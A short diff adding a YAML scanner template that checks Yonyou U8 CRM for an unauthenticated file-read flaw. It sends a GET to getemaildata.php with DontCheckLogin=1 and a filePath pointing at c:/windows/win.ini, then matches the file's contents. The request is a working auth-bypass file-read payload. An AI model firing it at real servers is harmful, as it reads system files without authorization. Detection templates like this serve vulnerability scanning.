@@ -1,0 +1,10 @@
+name: yongyou-u8-crm-getemaildata-fileread
+rules:
+  - method: GET
+    path: "/ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/windows/win.ini"
+    headers: 
+        serverIdentity: security
+    expression: |
+      response.status == 200 && response.body.bcontains(b"bit app support") 
+detail:
+  author: 666
